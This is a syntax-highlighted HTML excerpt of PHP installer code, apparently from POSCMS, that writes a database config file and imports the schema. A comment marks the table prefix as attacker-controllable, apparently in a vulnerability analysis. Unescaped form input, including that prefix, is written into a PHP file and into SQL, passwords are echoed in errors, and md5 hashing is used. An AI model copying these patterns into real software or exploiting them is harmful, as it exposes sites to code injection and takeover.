                <span class="nv">$recommendEnvironment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getRecommendEnvironment</span><span class="p">();</span>

                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$currentEnvironment</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">'_ischeck'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="kc">false</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$check_pass</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$writeAble</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$check_pass</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>

                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
                    <span class="s1">'writeAble'</span> <span class="o">=&gt;</span> <span class="nv">$writeAble</span><span class="p">,</span>
                    <span class="s1">'check_pass'</span> <span class="o">=&gt;</span> <span class="nv">$check_pass</span><span class="p">,</span>
                    <span class="s1">'lowestEnvironment'</span> <span class="o">=&gt;</span> <span class="nv">$lowestEnvironment</span><span class="p">,</span>
                    <span class="s1">'currentEnvironment'</span> <span class="o">=&gt;</span> <span class="nv">$currentEnvironment</span><span class="p">,</span>
                    <span class="s1">'recommendEnvironment'</span> <span class="o">=&gt;</span> <span class="nv">$recommendEnvironment</span><span class="p">,</span>
                <span class="p">));</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>

                <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span>
                    <span class="c1">// 数据库支持判断</span>
                    <span class="nv">$mysqli</span> <span class="o">=</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mysqli_init'</span><span class="p">)</span> <span class="o">?</span> <span class="nx">mysqli_init</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">'5.5.0'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$mysqli</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'您的PHP环境必须启用Mysqli扩展'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="c1">// 参数判断</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^[\x7f-\xff\dA-Za-z\.\_]+$/'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]))</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'管理员账号格式不正确'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'管理员密码不能为空'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">])</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库名称不能为空'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库名称不能是数字'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">],</span> <span class="s1">'.'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库名称不能存在.号'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">helper</span><span class="p">(</span><span class="s1">'email'</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="nx">valid_email</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'Email格式不正确'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$mysqli</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">mysqli_real_connect</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]))</span> <span class="p">{</span>
                            <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'[mysqli_real_connect] 无法连接到数据库服务器（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]</span><span class="o">.</span><span class="s1">'），请检查用户名（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）和密码（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）是否正确'</span><span class="p">));</span>
                        <span class="p">}</span>
                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">mysqli_select_db</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="s1">'CREATE DATABASE '</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
                                <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'指定的数据库（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）不存在，系统尝试创建失败，请通过其他方式建立数据库'</span><span class="p">));</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="c1">// utf8方式打开数据库</span>
                        <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="s1">'SET NAMES utf8'</span><span class="p">);</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]))</span> <span class="p">{</span>
                            <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">'&lt;br&gt;无法连接到数据库服务器（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]</span><span class="o">.</span><span class="s1">'），请检查用户名（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）和密码（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）是否正确'</span><span class="p">));</span>
                        <span class="p">}</span>
                        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'CREATE DATABASE '</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]))</span> <span class="p">{</span>
                                <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s1">'&lt;br&gt;指定的数据库（'</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]</span><span class="o">.</span><span class="s1">'）不存在，系统尝试创建失败，请通过其他方式建立数据库'</span><span class="p">));</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="c1">// utf8方式打开数据库</span>
                        <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'SET NAMES utf8'</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="c1">// 格式化端口</span>
                    <span class="k">list</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">])</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]);</span>
                    <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span> <span class="o">?</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span> <span class="o">:</span> <span class="mi">3306</span><span class="p">;</span>
                    <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'dr_'</span><span class="p">;</span> <span class="c1">// 这个变量可控</span>
                    <span class="c1">// 配置文件</span>
                    <span class="nv">$config</span> <span class="o">=</span> <span class="s2">"&lt;?php"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"if (!defined('BASEPATH')) exit('No direct script access allowed');"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">active_group = 'default';"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">query_builder  = TRUE;"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">db['default']  = array("</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dsn'   =&gt; '',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'hostname'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbhost'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'username'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbuser'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'password'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbpw'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'port'    =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbport'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'database'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbname'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dbdriver'  =&gt; '"</span><span class="o">.</span><span class="p">(</span><span class="nv">$mysqli</span> <span class="o">?</span> <span class="s1">'mysqli'</span> <span class="o">:</span> <span class="s1">'mysql'</span><span class="p">)</span><span class="o">.</span><span class="s2">"',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dbprefix'  =&gt; '</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dbprefix'</span><span class="p">]</span><span class="si">}</span><span class="s2">',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'pconnect'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'db_debug'  =&gt; true,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'cache_on'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'cachedir'  =&gt; 'cache/sql/',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'char_set'  =&gt; 'utf8',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'dbcollat'  =&gt; 'utf8_general_ci',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'swap_pre'  =&gt; '',"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'autoinit'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'encrypt' =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'compress'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'stricton'  =&gt; FALSE,"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">" 'failover'  =&gt; array(),"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="o">.=</span> <span class="s2">");"</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
                    <span class="c1">// 保存配置文件</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/database.php'</span><span class="p">,</span> <span class="nv">$config</span><span class="p">))</span> <span class="p">{</span>
                        <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">'数据库配置文件保存失败，请检查文件config/database.php权限！'</span><span class="p">));</span>
                    <span class="p">}</span>
                    <span class="c1">// 加载数据库</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">database</span><span class="p">();</span>
                    <span class="nv">$salt</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">999</span><span class="p">)),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
                    <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span><span class="o">.</span><span class="nv">$salt</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>

                    <span class="c1">// 导入表结构</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span>
                        <span class="k">array</span><span class="p">(</span><span class="s1">'{dbprefix}'</span><span class="p">,</span> <span class="s1">'{username}'</span><span class="p">,</span> <span class="s1">'{password}'</span><span class="p">,</span> <span class="s1">'{salt}'</span><span class="p">,</span> <span class="s1">'{email}'</span><span class="p">),</span>
                        <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">],</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$salt</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]),</span>
                        <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/install.sql'</span><span class="p">)</span>
                    <span class="p">));</span>

                    <span class="c1">// 导入会员菜单数据</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span>
                        <span class="s1">'{dbprefix}'</span><span class="p">,</span>
                        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">,</span>
                        <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/member_menu.sql'</span><span class="p">)</span>
                    <span class="p">));</span>

                    <span class="c1">// 系统配置文件</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'system_model'</span><span class="p">);</span>
                    <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'SYS_LOG'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
                        <span class="s1">'SYS_KEY'</span> <span class="o">=&gt;</span> <span class="s1">'poscms'</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">()),</span>
                        <span class="s1">'SYS_DEBUG'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
                        <span class="s1">'SYS_HELP_URL'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
                        <span class="s1">'SYS_EMAIL'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span>
                        <span class="s1">'SYS_MEMCACHE'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
                        <span class="s1">'SYS_UPLOAD_DIR'</span> <span class="o">=&gt;</span> <span class="nx">SYS_UPLOAD_DIR</span><span class="p">,</span>
                        <span class="s1">'SYS_CRON_QUEUE'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
                        <span class="s1">'SYS_CRON_NUMS'</span> <span class="o">=&gt;</span> <span class="mi">20</span><span class="p">,</span>
                        <span class="s1">'SYS_CRON_TIME'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>


                        <span class="s1">'SYS_ONLINE_NUM'</span> <span class="o">=&gt;</span> <span class="mi">1000</span><span class="p">,</span>
                        <span class="s1">'SYS_ONLINE_TIME'</span> <span class="o">=&gt;</span> <span class="mi">7200</span><span class="p">,</span>

                        <span class="s1">'SYS_NAME'</span> <span class="o">=&gt;</span> <span class="s1">'POSCMS'</span><span class="p">,</span>
                        <span class="s1">'SYS_NEWS'</span> <span class="o">=&gt;</span> <span class="s1">'TRUE'</span><span class="p">,</span>
                        <span class="s1">'SYS_CMS'</span> <span class="o">=&gt;</span> <span class="s1">'POSCMS'</span><span class="p">,</span>
                        <span class="s1">'SYS_UPDATE'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>

                        <span class="s1">'SITE_EXPERIENCE'</span> <span class="o">=&gt;</span> <span class="s1">'经验值'</span><span class="p">,</span>
                        <span class="s1">'SITE_SCORE'</span> <span class="o">=&gt;</span> <span class="s1">'虚拟币'</span><span class="p">,</span>
                        <span class="s1">'SITE_MONEY'</span> <span class="o">=&gt;</span> <span class="s1">'金钱'</span><span class="p">,</span>
                        <span class="s1">'SITE_CONVERT'</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
                        <span class="s1">'SITE_ADMIN_CODE'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
                        <span class="s1">'SITE_ADMIN_PAGESIZE'</span> <span class="o">=&gt;</span> <span class="mi">8</span><span class="p">,</span>

                        <span class="s1">'SYS_CACHE_INDEX'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_MINDEX'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_MSHOW'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_MSEARCH'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_SITEMAP'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_LIST'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_MEMBER'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_ATTACH'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_FORM'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_POSTER'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_SPACE'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
                        <span class="s1">'SYS_CACHE_TAG'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>

                    <span class="p">);</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">system_model</span><span class="o">-&gt;</span><span class="na">save_config</span><span class="p">(</span><span class="nv">$config</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span>
                    <span class="c1">// 站点配置文件</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'site_model'</span><span class="p">);</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">library</span><span class="p">(</span><span class="s1">'dconfig'</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/site/1.php'</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$config</span> <span class="o">=</span> <span class="k">require</span> <span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/site/1.php'</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_THEME'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_TEMPLATE'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
                    <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_DOMAIN'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_ATTACH_HOST'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_ATTACH_URL'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">]);</span>
                    <span class="nv">$site</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'POSCMS'</span><span class="p">,</span>
                        <span class="s1">'domain'</span> <span class="o">=&gt;</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">]),</span>
                        <span class="s1">'setting'</span> <span class="o">=&gt;</span> <span class="nv">$config</span><span class="p">,</span>
                    <span class="p">);</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">site_model</span><span class="o">-&gt;</span><span class="na">add_site</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dconfig</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/site/1.php'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">note</span><span class="p">(</span><span class="s1">'站点配置文件'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">space</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">to_require_one</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">site_model</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span>

                    <span class="c1">// 初始化菜单</span>
